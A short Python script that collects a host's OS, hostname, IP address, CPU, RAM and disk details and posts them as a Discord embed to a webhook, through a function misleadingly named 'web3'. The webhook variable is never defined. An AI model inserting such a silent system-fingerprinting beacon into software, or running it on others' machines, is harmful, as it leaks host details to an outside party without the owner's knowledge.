import platform
import socket
import psutil
import requests
import json

def sysinfos():
    py_version = platform.python_version()
    system = platform.system()
    release = platform.release()
    machine = platform.machine()
    processor = platform.processor()
    hostname = socket.gethostname()

    try:
        ip_address = socket.gethostbyname(hostname)
    except Exception:
        ip_address = "Unknown"

    ram = psutil.virtual_memory()
    total_ram_gb = ram.total / (1024 ** 3)

    cpu_count = psutil.cpu_count(logical=True)

    disk = psutil.disk_usage('/')
    disk_total_gb = disk.total / (1024 ** 3)
    disk_used_gb = disk.used / (1024 ** 3)
    disk_free_gb = disk.free / (1024 ** 3)

    embed = {
        "title": "System Information",
        "color": 3447003,
        "fields": [
            {"name": "Python Version", "value": py_version, "inline": True},
            {"name": "OS", "value": f"{system} {release}", "inline": True},
            {"name": "Machine", "value": machine, "inline": True},
            {"name": "Processor", "value": processor or "Unknown", "inline": True},
            {"name": "Hostname", "value": hostname, "inline": True},
            {"name": "IP Address", "value": ip_address, "inline": True},
            {"name": "CPU Cores", "value": str(cpu_count), "inline": True},
            {"name": "Total RAM (GB)", "value": f"{total_ram_gb:.2f} GB", "inline": True},
            {"name": "Disk Total", "value": f"{disk_total_gb:.2f} GB", "inline": True},
            {"name": "Disk Used", "value": f"{disk_used_gb:.2f} GB", "inline": True},
            {"name": "Disk Free", "value": f"{disk_free_gb:.2f} GB", "inline": True}
        ]
    }
    return embed

def web3():
    data = {
        "embeds": [sysinfos()]
    }
    headers = {
        "Content-Type": "application/json"
    }

    response = requests.post(webh, data=json.dumps(data), headers=headers)
    if response.status_code == 204:
        print("Embed sent!")
    else:
        print(f"Failed to send embed: {response.status_code} {response.text}")

if __name__ == "__main__":
    web3()